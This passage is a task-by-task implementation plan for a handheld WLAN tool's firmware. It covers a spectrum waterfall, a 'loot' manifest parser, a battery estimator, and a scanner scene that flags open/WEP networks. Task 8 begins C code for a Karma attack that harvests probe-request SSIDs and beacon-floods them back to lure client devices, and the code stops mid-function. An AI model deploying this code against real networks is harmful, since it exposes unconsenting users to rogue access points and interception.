#include <string.h>

#define SPEC_CHANNELS 13
#define SPEC_ROWS 40

typedef struct {
    uint16_t cur_count[SPEC_CHANNELS];
    int8_t   cur_peak[SPEC_CHANNELS];
    uint8_t  rows[SPEC_ROWS][SPEC_CHANNELS];
    uint8_t  head;
    uint8_t  filled;
} WlanSpectrum;

void wlan_spectrum_reset(WlanSpectrum* s);
void wlan_spectrum_set_dwell(WlanSpectrum* s, uint8_t channel,
                             uint16_t frame_count, int8_t peak_rssi);
void wlan_spectrum_commit_sweep(WlanSpectrum* s);
uint8_t wlan_spectrum_live_level(const WlanSpectrum* s, uint8_t channel);
uint8_t wlan_spectrum_cell(const WlanSpectrum* s, uint8_t row_from_top, uint8_t channel);
```

- [ ] **Step 4: Write the implementation** — `applications/main/wlan_app/wlan_spectrum.c`

```c
#include "wlan_spectrum.h"

static uint8_t spec_level(uint16_t count, int8_t peak) {
    if(count == 0) return 0;
    uint16_t c = count > 20 ? 20 : count;
    int level = 1 + (int)(c / 2);       // 1..11
    if(peak > -60) level += 4;
    else if(peak > -80) level += 2;
    if(level > 15) level = 15;
    return (uint8_t)level;
}

void wlan_spectrum_reset(WlanSpectrum* s) {
    memset(s, 0, sizeof(*s));
    for(int i = 0; i < SPEC_CHANNELS; i++) s->cur_peak[i] = -128;
}

void wlan_spectrum_set_dwell(WlanSpectrum* s, uint8_t channel,
                             uint16_t frame_count, int8_t peak_rssi) {
    if(channel < 1 || channel > SPEC_CHANNELS) return;
    s->cur_count[channel - 1] = frame_count;
    s->cur_peak[channel - 1] = peak_rssi;
}

void wlan_spectrum_commit_sweep(WlanSpectrum* s) {
    for(int i = 0; i < SPEC_CHANNELS; i++) {
        s->rows[s->head][i] = spec_level(s->cur_count[i], s->cur_peak[i]);
    }
    s->head = (uint8_t)((s->head + 1) % SPEC_ROWS);
    if(s->filled < SPEC_ROWS) s->filled++;
    for(int i = 0; i < SPEC_CHANNELS; i++) { s->cur_count[i] = 0; s->cur_peak[i] = -128; }
}

uint8_t wlan_spectrum_live_level(const WlanSpectrum* s, uint8_t channel) {
    if(channel < 1 || channel > SPEC_CHANNELS) return 0;
    return spec_level(s->cur_count[channel - 1], s->cur_peak[channel - 1]);
}

uint8_t wlan_spectrum_cell(const WlanSpectrum* s, uint8_t row_from_top, uint8_t channel) {
    if(channel < 1 || channel > SPEC_CHANNELS) return 0;
    if(row_from_top >= s->filled) return 0;
    // newest row = head-1; walk backwards
    int idx = (int)s->head - 1 - (int)row_from_top;
    idx %= SPEC_ROWS;
    if(idx < 0) idx += SPEC_ROWS;
    return s->rows[idx][channel - 1];
}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `wsl.exe -- bash -lc "cd '/mnt/c/Users/stone/Downloads/_fzcard_work/Flipper-Zero-meets-M5Stack-Cardputer-1.15' && gcc -Wall -Wextra -o /tmp/t tests/test_wlan_spectrum.c && /tmp/t"`
Expected: PASS — `test_wlan_spectrum OK`.

- [ ] **Step 6: Commit**

```bash
git add applications/main/wlan_app/wlan_spectrum.h applications/main/wlan_app/wlan_spectrum.c tests/test_wlan_spectrum.c
git commit -m "feat(wlan): spectrum waterfall aggregator (host-tested)"
```

---

## Task 5 — Pure module: loot manifest.csv line parser

**Files:**
- Create: `applications/main/wlan_app/wlan_loot_manifest.h`
- Create: `applications/main/wlan_app/wlan_loot_manifest.c`
- Test: `tests/test_wlan_loot_manifest.c`

**Interfaces:**
- Consumes: nothing.
- Produces:
  ```c
  typedef struct {
      char timestamp[24];
      char type[24];
      char target[48];
      char detail[80];
  } WlanManifestRow;
  // Parse one manifest.csv line "ts,type,target,detail". Splits on the first 3
  // commas; the 4th field takes the remainder (may itself contain commas — but
  // wlan_loot_record neutralizes those, so in practice it won't). Returns false
  // for the header row ("timestamp,...") and for empty/blank lines.
  bool wlan_manifest_parse_line(const char* line, WlanManifestRow* out);
  ```

- [ ] **Step 1: Write the failing test** — `tests/test_wlan_loot_manifest.c`

```c
#include "../applications/main/wlan_app/wlan_loot_manifest.c"
#include <assert.h>
#include <stdio.h>

int main(void) {
    WlanManifestRow r;

    assert(wlan_manifest_parse_line("2026-07-11 06:49:00,pmkid,HomeNet,aabbccdd", &r));
    assert(strcmp(r.timestamp, "2026-07-11 06:49:00") == 0);
    assert(strcmp(r.type, "pmkid") == 0);
    assert(strcmp(r.target, "HomeNet") == 0);
    assert(strcmp(r.detail, "aabbccdd") == 0);

    // empty target + detail
    assert(wlan_manifest_parse_line("2026-07-11 06:50:00,karma,,", &r));
    assert(strcmp(r.type, "karma") == 0);
    assert(r.target[0] == '\0');
    assert(r.detail[0] == '\0');

    // header rejected
    assert(!wlan_manifest_parse_line("timestamp,type,target,detail", &r));
    // blank / trailing newline handling
    assert(!wlan_manifest_parse_line("", &r));
    assert(!wlan_manifest_parse_line("\n", &r));
    assert(wlan_manifest_parse_line("2026,alert,X,deauth flood\n", &r));
    assert(strcmp(r.detail, "deauth flood") == 0); // trailing \n stripped

    // too few fields → false
    assert(!wlan_manifest_parse_line("2026,onlytwo", &r));

    printf("test_wlan_loot_manifest OK\n");
    return 0;
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `wsl.exe -- bash -lc "cd '/mnt/c/Users/stone/Downloads/_fzcard_work/Flipper-Zero-meets-M5Stack-Cardputer-1.15' && gcc -Wall -Wextra -o /tmp/t tests/test_wlan_loot_manifest.c && /tmp/t"`
Expected: FAIL — `wlan_loot_manifest.c: No such file`.

- [ ] **Step 3: Write the header** — `applications/main/wlan_app/wlan_loot_manifest.h`

```c
#pragma once
#include <stdint.h>
#include <stdbool.h>
#include <string.h>

typedef struct {
    char timestamp[24];
    char type[24];
    char target[48];
    char detail[80];
} WlanManifestRow;

bool wlan_manifest_parse_line(const char* line, WlanManifestRow* out);
```

- [ ] **Step 4: Write the implementation** — `applications/main/wlan_app/wlan_loot_manifest.c`

```c
#include "wlan_loot_manifest.h"

// Copy up to the next ',' (or end) from *pp into dst; advance *pp past the comma.
// Returns false if there was no field (NULL cursor).
static bool mf_field(const char** pp, char* dst, size_t dst_sz, bool last) {
    const char* p = *pp;
    if(!p) return false;
    size_t j = 0;
    while(*p && (last || *p != ',') && *p != '\n' && *p != '\r') {
        if(j < dst_sz - 1) dst[j++] = *p;
        p++;
    }
    dst[j] = '\0';
    if(!last) {
        if(*p == ',') { *pp = p + 1; }
        else { *pp = NULL; } // no more commas — field list ended early
    }
    return true;
}

bool wlan_manifest_parse_line(const char* line, WlanManifestRow* out) {
    if(!line || line[0] == '\0' || line[0] == '\n' || line[0] == '\r') return false;
    if(strncmp(line, "timestamp,", 10) == 0) return false; // header
    const char* p = line;
    if(!mf_field(&p, out->timestamp, sizeof(out->timestamp), false)) return false;
    if(!p || !mf_field(&p, out->type, sizeof(out->type), false)) return false;
    if(!p || !mf_field(&p, out->target, sizeof(out->target), false)) return false;
    if(!p) return false; // needed a 4th field
    mf_field(&p, out->detail, sizeof(out->detail), true);
    return true;
}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `wsl.exe -- bash -lc "cd '/mnt/c/Users/stone/Downloads/_fzcard_work/Flipper-Zero-meets-M5Stack-Cardputer-1.15' && gcc -Wall -Wextra -o /tmp/t tests/test_wlan_loot_manifest.c && /tmp/t"`
Expected: PASS — `test_wlan_loot_manifest OK`.

- [ ] **Step 6: Commit**

```bash
git add applications/main/wlan_app/wlan_loot_manifest.h applications/main/wlan_app/wlan_loot_manifest.c tests/test_wlan_loot_manifest.c
git commit -m "feat(wlan): loot manifest.csv line parser (host-tested)"
```

---

## Task 6 — Pure module: power charge/runtime estimator + curve ring

Used by the Power Monitor app (Task 13). File lives in the future `power_monitor/` dir; it is inert (not auto-compiled) until Task 13 adds `application.fam`.

**Files:**
- Create: `applications/main/power_monitor/power_estimate.h`
- Create: `applications/main/power_monitor/power_estimate.c`
- Test: `tests/test_power_estimate.c`

**Interfaces:**
- Consumes: nothing.
- Produces:
  ```c
  #define PWR_CURVE_LEN 96
  typedef struct {
      uint8_t samples[PWR_CURVE_LEN]; // charge % ring
      uint8_t head;
      uint8_t filled;
  } PowerCurve;
  void power_curve_reset(PowerCurve* c);
  void power_curve_push(PowerCurve* c, uint8_t charge_pct); // clamps to 0..100
  uint8_t power_curve_get(const PowerCurve* c, uint8_t idx_from_oldest); // 0..filled-1
  // Estimate minutes remaining from current + capacity.
  //  charging=true  → minutes to 100%   (uses (100-pct) headroom)
  //  charging=false → minutes to 0%      (uses pct)
  // current_ma = |gauge current| in mA. Returns -1 if current_ma==0 or pct at the rail.
  int32_t power_estimate_minutes(bool charging, uint32_t current_ma,
                                 uint32_t capacity_mah, uint8_t charge_pct);
  ```

- [ ] **Step 1: Write the failing test** — `tests/test_power_estimate.c`

```c
#include "../applications/main/power_monitor/power_estimate.c"
#include <assert.h>
#include <stdio.h>

int main(void) {
    PowerCurve c;
    power_curve_reset(&c);
    assert(c.filled == 0);
    power_curve_push(&c, 50);
    power_curve_push(&c, 60);
    power_curve_push(&c, 200); // clamps to 100
    assert(c.filled == 3);
    assert(power_curve_get(&c, 0) == 50);  // oldest
    assert(power_curve_get(&c, 2) == 100); // newest (clamped)

    // ring wraps, oldest dropped
    for (int i = 0; i < PWR_CURVE_LEN + 20; i++) power_curve_push(&c, (uint8_t)(i % 101));
    assert(c.filled == PWR_CURVE_LEN);

    // discharge: 1000 mAh at 50% = 500 mAh usable, 500 mA draw → 60 min
    assert(power_estimate_minutes(false, 500, 1000, 50) == 60);
    // charge: 1000 mAh, 20% → 80% headroom = 800 mAh, 800 mA → 60 min
    assert(power_estimate_minutes(true, 800, 1000, 20) == 60);
    // zero current → -1
    assert(power_estimate_minutes(false, 0, 1000, 50) == -1);
    // full while charging → -1 (no headroom)
    assert(power_estimate_minutes(true, 500, 1000, 100) == -1);
    // empty while discharging → -1
    assert(power_estimate_minutes(false, 500, 1000, 0) == -1);

    printf("test_power_estimate OK\n");
    return 0;
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `wsl.exe -- bash -lc "cd '/mnt/c/Users/stone/Downloads/_fzcard_work/Flipper-Zero-meets-M5Stack-Cardputer-1.15' && gcc -Wall -Wextra -o /tmp/t tests/test_power_estimate.c && /tmp/t"`
Expected: FAIL — `power_estimate.c: No such file`.

- [ ] **Step 3: Write the header** — `applications/main/power_monitor/power_estimate.h`

```c
#pragma once
#include <stdint.h>
#include <stdbool.h>
#include <string.h>

#define PWR_CURVE_LEN 96

typedef struct {
    uint8_t samples[PWR_CURVE_LEN];
    uint8_t head;
    uint8_t filled;
} PowerCurve;

void power_curve_reset(PowerCurve* c);
void power_curve_push(PowerCurve* c, uint8_t charge_pct);
uint8_t power_curve_get(const PowerCurve* c, uint8_t idx_from_oldest);
int32_t power_estimate_minutes(bool charging, uint32_t current_ma,
                               uint32_t capacity_mah, uint8_t charge_pct);
```

- [ ] **Step 4: Write the implementation** — `applications/main/power_monitor/power_estimate.c`

```c
#include "power_estimate.h"

void power_curve_reset(PowerCurve* c) {
    memset(c, 0, sizeof(*c));
}

void power_curve_push(PowerCurve* c, uint8_t charge_pct) {
    if(charge_pct > 100) charge_pct = 100;
    c->samples[c->head] = charge_pct;
    c->head = (uint8_t)((c->head + 1) % PWR_CURVE_LEN);
    if(c->filled < PWR_CURVE_LEN) c->filled++;
}

uint8_t power_curve_get(const PowerCurve* c, uint8_t idx_from_oldest) {
    if(idx_from_oldest >= c->filled) return 0;
    uint8_t start = (c->filled == PWR_CURVE_LEN) ? c->head : 0;
    return c->samples[(start + idx_from_oldest) % PWR_CURVE_LEN];
}

int32_t power_estimate_minutes(bool charging, uint32_t current_ma,
                               uint32_t capacity_mah, uint8_t charge_pct) {
    if(current_ma == 0) return -1;
    if(charge_pct > 100) charge_pct = 100;
    uint32_t pct_span = charging ? (uint32_t)(100 - charge_pct) : (uint32_t)charge_pct;
    if(pct_span == 0) return -1;
    // mAh to move, then hours = mAh/mA, minutes = *60.
    uint32_t mah = (capacity_mah * pct_span) / 100;
    if(mah == 0) return -1;
    return (int32_t)((mah * 60) / current_ma);
}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `wsl.exe -- bash -lc "cd '/mnt/c/Users/stone/Downloads/_fzcard_work/Flipper-Zero-meets-M5Stack-Cardputer-1.15' && gcc -Wall -Wextra -o /tmp/t tests/test_power_estimate.c && /tmp/t"`
Expected: PASS — `test_power_estimate OK`.

- [ ] **Step 6: Commit**

```bash
git add applications/main/power_monitor/power_estimate.h applications/main/power_monitor/power_estimate.c tests/test_power_estimate.c
git commit -m "feat(power): charge/runtime estimator + curve ring (host-tested)"
```

---

## Task 7 — Feature: Spectrum Waterfall scene + view

Custom canvas view (model holds a pointer to a scene-owned `WlanSpectrum`). Tick-driven channel hop (one channel per 250 ms tick, 13 ticks/sweep). Background `wlan_hal_scan()` on enter tags VULN (open/WEP) and HIDDEN channels for the filter.

**Files:**
- Create: `applications/main/wlan_app/views/wlan_spectrum_view.h`
- Create: `applications/main/wlan_app/views/wlan_spectrum_view.c`
- Create: `applications/main/wlan_app/scenes/scene_spectrum.c`
- Modify: `applications/main/wlan_app/wlan_app.h` — add `WlanAppViewSpectrum` enumerator + `#include "views/wlan_spectrum_view.h"` + `View* view_spectrum;` field.
- Modify: `applications/main/wlan_app/wlan_app.c` — alloc/register/free the view.
- Modify: `applications/main/wlan_app/scenes/scene_config.h` — append `ADD_SCENE(wlan_app, spectrum, Spectrum)`.

**Interfaces:**
- Consumes: `wlan_spectrum.h` (Task 4).
- Produces:
  ```c
  // wlan_spectrum_view.h
  typedef enum { SpecFilterAll, SpecFilterVuln, SpecFilterHidden } WlanSpecFilter;
  typedef struct {
      const WlanSpectrum* spec; // scene-owned, set once on enter
      uint8_t cur_channel;      // 1..13 currently dwelling
      bool locked;              // channel-locked vs auto-hop
      bool paused;
      WlanSpecFilter filter;
      uint16_t vuln_mask;       // bit (ch-1) set = channel hosts open/WEP AP
      uint16_t hidden_mask;     // bit (ch-1) set = channel hosts hidden-SSID AP
  } WlanSpectrumViewModel;
  View* wlan_spectrum_view_alloc(void);
  void  wlan_spectrum_view_free(View* v);
  ```

- [ ] **Step 1: Write the view header** — `applications/main/wlan_app/views/wlan_spectrum_view.h`

```c
#pragma once
#include <gui/view.h>
#include "../wlan_spectrum.h"

typedef enum { SpecFilterAll, SpecFilterVuln, SpecFilterHidden } WlanSpecFilter;

typedef struct {
    const WlanSpectrum* spec;
    uint8_t cur_channel;
    bool locked;
    bool paused;
    WlanSpecFilter filter;
    uint16_t vuln_mask;
    uint16_t hidden_mask;
} WlanSpectrumViewModel;

View* wlan_spectrum_view_alloc(void);
void wlan_spectrum_view_free(View* v);
```

- [ ] **Step 2: Write the view** — `applications/main/wlan_app/views/wlan_spectrum_view.c`

Display 128×64. Top strip (y 0..14): 13 live RSSI bars. Body (y 16..63): scrolling waterfall, 13 columns × up to 40 rows, cell shaded by intensity via a 4-level dither. Non-matching channels (per filter) are dimmed (drawn at half density). Input returns false (scene owns navigation + keys via custom events — but this view needs Left/Right/OK/filter keys, so handle them here and emit through a callback like the sniffer view). To keep it simple and match `wlan_pmkid_view` (which returns false and lets the dispatcher/back-handler navigate), route control keys through the scene by having the view input callback emit custom events on a stored `ViewDispatcher*`. Use `view_set_context` to stash the dispatcher (mirrors `wlan_portscan_view`/`wlan_handshake_view` which call `view_set_context(view, app->view_dispatcher)`).

```c
#include "wlan_spectrum_view.h"
#include <gui/elements.h>
#include <furi.h>
#include <input/input.h>
#include "views/wlan_view_events.h" // for a shared custom-event enum if present; else define below

// Custom events emitted to the scene (values chosen to not collide with 0).
typedef enum {
    SpectrumEvtLeft = 0x5001,
    SpectrumEvtRight,
    SpectrumEvtOk,
    SpectrumEvtFilter,
} SpectrumEvt;

static void draw_dither_cell(Canvas* canvas, int x, int y, int w, int h, uint8_t level, bool dim) {
    // level 0..15 → 0..4 density buckets; dim halves it.
    uint8_t b = level / 4; // 0..3 (15/4=3)
    if(dim && b) b--;
    if(b == 0) return;
    for(int yy = 0; yy < h; yy++) {
        for(int xx = 0; xx < w; xx++) {
            // ordered-ish dither: denser bucket → more set pixels
            int r = (xx + yy) & 3;
            if(r < b) canvas_draw_dot(canvas, x + xx, y + yy);
        }
    }
}

static bool ch_matches(const WlanSpectrumViewModel* m, uint8_t ch) {
    if(m->filter == SpecFilterVuln) return (m->vuln_mask >> (ch - 1)) & 1;
    if(m->filter == SpecFilterHidden) return (m->hidden_mask >> (ch - 1)) & 1;
    return true;
}

static void spectrum_draw(Canvas* canvas, void* model) {
    WlanSpectrumViewModel* m = model;
    canvas_clear(canvas);
    canvas_set_font(canvas, FontSecondary);

    // Header line
    char hdr[32];
    const char* fname = m->filter == SpecFilterVuln ? "VULN" :
                        m->filter == SpecFilterHidden ? "HIDDEN" : "ALL";
    snprintf(hdr, sizeof(hdr), "%s CH%u %s%s",
             m->locked ? "LOCK" : "HOP", (unsigned)m->cur_channel,
             fname, m->paused ? " ||" : "");
    canvas_draw_str(canvas, 2, 8, hdr);

    // Column geometry: 13 channels across 128 px → ~9 px each starting x=4.
    const int x0 = 4, cw = 9;

    // Top strip live bars (y 10..14, 5 px tall).
    if(m->spec) {
        for(uint8_t ch = 1; ch <= SPEC_CHANNELS; ch++) {
            uint8_t lvl = wlan_spectrum_live_level(m->spec, ch);
            int bh = (lvl * 5) / 15;
            int x = x0 + (ch - 1) * cw;
            bool dim = !ch_matches(m, ch);
            if(!dim) canvas_draw_box(canvas, x, 14 - bh, cw - 1, bh);
            else if(bh) canvas_draw_frame(canvas, x, 14 - bh, cw - 1, bh);
            if(ch == m->cur_channel) canvas_draw_line(canvas, x, 15, x + cw - 2, 15);
        }
    }

    // Waterfall body y 17..63 → up to (63-17)=46 rows but we have 40; 1 px/row.
    if(m->spec) {
        int rows = SPEC_ROWS < 46 ? SPEC_ROWS : 46;
        for(int r = 0; r < rows; r++) {
            int y = 17 + r;
            for(uint8_t ch = 1; ch <= SPEC_CHANNELS; ch++) {
                uint8_t lvl = wlan_spectrum_cell(m->spec, (uint8_t)r, ch);
                int x = x0 + (ch - 1) * cw;
                draw_dither_cell(canvas, x, y, cw - 1, 1, lvl, !ch_matches(m, ch));
            }
        }
    }
}

static bool spectrum_input(InputEvent* event, void* context) {
    ViewDispatcher* vd = context;
    if(event->type != InputTypeShort && event->type != InputTypeRepeat) return false;
    switch(event->key) {
    case InputKeyLeft:  view_dispatcher_send_custom_event(vd, SpectrumEvtLeft);  return true;
    case InputKeyRight: view_dispatcher_send_custom_event(vd, SpectrumEvtRight); return true;
    case InputKeyOk:    view_dispatcher_send_custom_event(vd, SpectrumEvtOk);    return true;
    case InputKeyUp:
    case InputKeyDown:  view_dispatcher_send_custom_event(vd, SpectrumEvtFilter); return true;
    default: return false; // Back falls through to the scene-manager back handler
    }
}

View* wlan_spectrum_view_alloc(void) {
    View* v = view_alloc();
    view_allocate_model(v, ViewModelTypeLocking, sizeof(WlanSpectrumViewModel));
    view_set_draw_callback(v, spectrum_draw);
    view_set_input_callback(v, spectrum_input);
    return v;
}

void wlan_spectrum_view_free(View* v) {
    view_free(v);
}
```
> If `views/wlan_view_events.h` does not already define a shared enum you need, the local `SpectrumEvt` above is self-contained — you may drop the `#include "views/wlan_view_events.h"` line if it causes an unused-include warning. Verify by reading that header first.

- [ ] **Step 3: Register the view + enum + field**

In `wlan_app.h`: add `#include "views/wlan_spectrum_view.h"` with the other view includes; add `WlanAppViewSpectrum,` just before the closing `}` of the `WlanAppView` enum; add `View* view_spectrum;` to `struct WlanApp` near the other `View*` fields.

In `wlan_app.c` `wlan_app_alloc()` (after the sniffer view block ~line 105):
```c
    app->view_spectrum = wlan_spectrum_view_alloc();
    view_set_context(app->view_spectrum, app->view_dispatcher);
    view_dispatcher_add_view(app->view_dispatcher, WlanAppViewSpectrum, app->view_spectrum);
```
In `wlan_app_free()`: add `view_dispatcher_remove_view(app->view_dispatcher, WlanAppViewSpectrum);` with the other removes, and `wlan_spectrum_view_free(app->view_spectrum);` with the other frees.
(Leave `wlan_app_portal_views_free/restore` untouched — Spectrum is not in that reclaim set.)

- [ ] **Step 4: Write the scene** — `applications/main/wlan_app/scenes/scene_spectrum.c`

```c
#include "../wlan_app.h"
#include "../wlan_hal.h"
#include "../wlan_spectrum.h"
#include <esp_wifi.h>
#include <string.h>

#define SPEC_MIN_CH 1
#define SPEC_MAX_CH 13

static WlanSpectrum s_spec;
static volatile uint32_t s_dwell_count;
static volatile int8_t s_dwell_peak;
static uint8_t s_cur_ch;
static bool s_running;

static void spectrum_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if(type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
    const wifi_promiscuous_pkt_t* pkt = buf;
    s_dwell_count++;
    int8_t rssi = (int8_t)pkt->rx_ctrl.rssi;
    if(rssi > s_dwell_peak) s_dwell_peak = rssi;
}

// Background scan to tag VULN (open/WEP) + HIDDEN channels.
static void spectrum_tag_channels(WlanApp* app) {
    uint16_t vuln = 0, hidden = 0;
    wifi_ap_record_t* recs = NULL;
    uint16_t n = 0;
    wlan_hal_scan(&recs, &n, WLAN_APP_MAX_APS);
    for(uint16_t i = 0; i < n; i++) {
        uint8_t ch = recs[i].primary;
        if(ch < 1 || ch > SPEC_MAX_CH) continue;
        if(recs[i].authmode == WIFI_AUTH_OPEN || recs[i].authmode == WIFI_AUTH_WEP) {
            vuln |= (uint16_t)(1u << (ch - 1));
        }
        if(recs[i].ssid[0] == '\0') hidden |= (uint16_t)(1u << (ch - 1));
    }
    if(recs) free(recs);
    with_view_model(
        app->view_spectrum, WlanSpectrumViewModel * m,
        { m->vuln_mask = vuln; m->hidden_mask = hidden; }, true);
}

void wlan_app_scene_spectrum_on_enter(void* context) {
    WlanApp* app = context;
    wlan_spectrum_reset(&s_spec);
    s_dwell_count = 0;
    s_dwell_peak = -128;
    s_cur_ch = SPEC_MIN_CH;
    s_running = true;

    with_view_model(
        app->view_spectrum, WlanSpectrumViewModel * m,
        {
            m->spec = &s_spec;
            m->cur_channel = s_cur_ch;
            m->locked = false;
            m->paused = false;
            m->filter = SpecFilterAll;
            m->vuln_mask = 0;
            m->hidden_mask = 0;
        },
        true);

    if(!wlan_hal_is_started()) wlan_hal_start();
    if(wlan_hal_is_connected()) wlan_hal_disconnect();
    spectrum_tag_channels(app); // one-shot scan before promiscuous
    wlan_hal_set_channel(s_cur_ch);
    wlan_hal_set_promiscuous(true, spectrum_cb);

    view_dispatcher_switch_to_view(app->view_dispatcher, WlanAppViewSpectrum);
}

bool wlan_app_scene_spectrum_on_event(void* context, SceneManagerEvent event) {
    WlanApp* app = context;
    bool consumed = false;

    if(event.type == SceneManagerEventTypeCustom) {
        bool locked = false, paused = false;
        with_view_model(
            app->view_spectrum, WlanSpectrumViewModel * m,
            { locked = m->locked; paused = m->paused; }, false);
        switch(event.event) {
        case 0x5002: /* SpectrumEvtRight */
        case 0x5001: /* SpectrumEvtLeft  */ {
            // Toggle lock; when locking, stay on current channel.
            bool nl = !locked;
            with_view_model(app->view_spectrum, WlanSpectrumViewModel * m,
                            { m->locked = nl; }, true);
            consumed = true;
            break;
        }
        case 0x5003: /* SpectrumEvtOk */ {
            bool np = !paused;
            with_view_model(app->view_spectrum, WlanSpectrumViewModel * m,
                            { m->paused = np; }, true);
            consumed = true;
            break;
        }
        case 0x5004: /* SpectrumEvtFilter */ {
            with_view_model(
                app->view_spectrum, WlanSpectrumViewModel * m,
                { m->filter = (WlanSpecFilter)((m->filter + 1) % 3); }, true);
            consumed = true;
            break;
        }
        }
    } else if(event.type == SceneManagerEventTypeTick && s_running) {
        bool locked = false, paused = false;
        with_view_model(
            app->view_spectrum, WlanSpectrumViewModel * m,
            { locked = m->locked; paused = m->paused; }, false);
        if(!paused) {
            // Close the dwell just finished for s_cur_ch.
            wlan_spectrum_set_dwell(&s_spec, s_cur_ch,
                                    (uint16_t)s_dwell_count, s_dwell_peak);
            if(!locked) {
                if(s_cur_ch >= SPEC_MAX_CH) {
                    wlan_spectrum_commit_sweep(&s_spec);
                    s_cur_ch = SPEC_MIN_CH;
                } else {
                    s_cur_ch++;
                }
            } else {
                // Locked: each tick is its own single-channel "sweep" row.
                wlan_spectrum_commit_sweep(&s_spec);
            }
            s_dwell_count = 0;
            s_dwell_peak = -128;
            wlan_hal_set_channel(s_cur_ch);
            with_view_model(app->view_spectrum, WlanSpectrumViewModel * m,
                            { m->cur_channel = s_cur_ch; }, true);
        }
    }
    return consumed;
}

void wlan_app_scene_spectrum_on_exit(void* context) {
    UNUSED(context);
    wlan_hal_set_promiscuous(false, NULL);
    s_running = false;
    s_dwell_count = 0;
    s_dwell_peak = -128;
}
```
> The event `case` values must equal the `SpectrumEvt` enum from the view (`0x5001..0x5004`). Either `#include` the view header and use the enum names, or keep the numeric literals with the comments as shown. Prefer including the enum: move `SpectrumEvt` into `wlan_spectrum_view.h` so both files share it, and replace the numeric `case`s with `SpectrumEvtLeft` etc. Do this refactor as part of Step 2/Step 4.

- [ ] **Step 5: Register the scene** — append to `applications/main/wlan_app/scenes/scene_config.h`:
```c
ADD_SCENE(wlan_app, spectrum, Spectrum)
```

- [ ] **Step 6: Build**

Run: `MSYS_NO_PATHCONV=1 cmd.exe /c "C:\Users\stone\Downloads\_fzcard_work\Flipper-Zero-meets-M5Stack-Cardputer-1.15\build_ci.bat" > build_spectrum.log 2>&1; echo "EXIT=$?"`
Expected: log contains `Project build complete` and `=== BUILD OK ===`, `EXIT=0`.

- [ ] **Step 7: Commit**

```bash
git add applications/main/wlan_app/views/wlan_spectrum_view.h applications/main/wlan_app/views/wlan_spectrum_view.c applications/main/wlan_app/scenes/scene_spectrum.c applications/main/wlan_app/scenes/scene_config.h applications/main/wlan_app/wlan_app.h applications/main/wlan_app/wlan_app.c
git commit -m "feat(wlan): Spectrum Waterfall scene + view"
```

---

## Task 8 — Feature: Karma attack — HAL primitives + scene (reuses sniffer view)

Adds a self-contained Karma worker to `wlan_hal.c` (harvest probe-request SSIDs via promiscuous + beacon-flood the harvested set, reusing the existing beacon frame builder) and a scene that drives it and shows stats on the existing sniffer view.

**Files:**
- Modify: `applications/main/wlan_app/wlan_hal.h` — declare Karma API.
- Modify: `applications/main/wlan_app/wlan_hal.c` — implement Karma worker (near the beacon-spam block ~line 717).
- Create: `applications/main/wlan_app/scenes/scene_karma.c`
- Modify: `applications/main/wlan_app/scenes/scene_config.h` — append `ADD_SCENE(wlan_app, karma, Karma)`.

**Interfaces:**
- Consumes: `wlan_probe_parse.h` (Task 1), existing `prepare_beacon_packet` / `wlan_hal_random_mac`, `wlan_sniffer_view` API.
- Produces (in `wlan_hal.h`):
  ```c
  typedef struct {
      uint16_t harvested;      // unique probed SSIDs captured
      uint32_t beacons_sent;   // beacon frames flooded
      char top_ssid[33];       // first/representative harvested SSID
  } WlanHalKarmaStats;
  void wlan_hal_karma_start(void);
  void wlan_hal_karma_stop(void);
  bool wlan_hal_karma_is_running(void);
  void wlan_hal_karma_get_stats(WlanHalKarmaStats* out);
  ```

- [ ] **Step 1: Declare the API** — add to `applications/main/wlan_app/wlan_hal.h` (after the beacon-spam declarations, before the Evil Portal section):
```c
// ---------------------------------------------------------------------------
// Karma: harvest probe-request SSIDs (client PNL) + beacon-flood them back so a
// probing device sees its remembered network advertised. Authorized-pentest
// primitive. Reuses the beacon frame builder + random MAC.
// ---------------------------------------------------------------------------
typedef struct {
    uint16_t harvested;
    uint32_t beacons_sent;
    char top_ssid[33];
} WlanHalKarmaStats;
void wlan_hal_karma_start(void);
void wlan_hal_karma_stop(void);
bool wlan_hal_karma_is_running(void);
void wlan_hal_karma_get_stats(WlanHalKarmaStats* out);
```

- [ ] **Step 2: Implement the worker** — add to `applications/main/wlan_app/wlan_hal.c`.

At the top includes, add `#include "wlan_probe_parse.h"`. After the beacon-spam block (after `wlan_hal_beacon_spam_get_frame_count`, ~line 716), add:
```c
// ---- Karma -----------------------------------------------------------------
static volatile bool s_karma_active = false;
static TaskHandle_t s_karma_task = NULL;
static WlanSsidSet s_karma_pnl;          // harvested SSIDs (bounded 32)
static FuriMutex* s_karma_lock = NULL;
static volatile uint32_t s_karma_beacons = 0;

// Promiscuous RX callback: harvest probe-request SSIDs into the PNL set.
static void karma_promisc_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if(type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t* pkt = buf;
    uint16_t len = (uint16_t)pkt->rx_ctrl.sig_len;
    char ssid[WLAN_PROBE_SSID_MAX];
    uint8_t mac[6];
    if(!wlan_probe_extract(pkt->payload, len, ssid, mac)) return;
    if(ssid[0] == '\0') return; // skip wildcard probes
    // SSID must fit the 802.11 beacon we rebroadcast (<=32) — already guaranteed.
    if(s_karma_lock && furi_mutex_acquire(s_karma_lock, 0) == FuriStatusOk) {
        wlan_ssid_set_insert(&s_karma_pnl, ssid);
        furi_mutex_release(s_karma_lock);
    }
}

static void karma_task(void* param) {
    (void)param;
    uint8_t mac[6];
    uint8_t packet[sizeof(beacon_packet_template)];
    uint8_t channel = 1;
    uint16_t idx = 0;

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(karma_promisc_cb);

    while(s_karma_active) {
        // Snapshot one SSID from the harvested PNL to advertise this iteration.
        char ssid[WLAN_PROBE_SSID_MAX] = {0};
        uint8_t count = 0;
        if(s_karma_lock && furi_mutex_acquire(s_karma_lock, 0) == FuriStatusOk) {
            count = s_karma_pnl.count;
            if(count) {
                if(idx >= count) idx = 0;
                strncpy(ssid, s_karma_pnl.ssids[idx], WLAN_PROBE_SSID_MAX - 1);
                idx++;
            }
            furi_mutex_release(s_karma_lock);
        }
        if(ssid[0]) {
            wlan_hal_random_mac(mac);
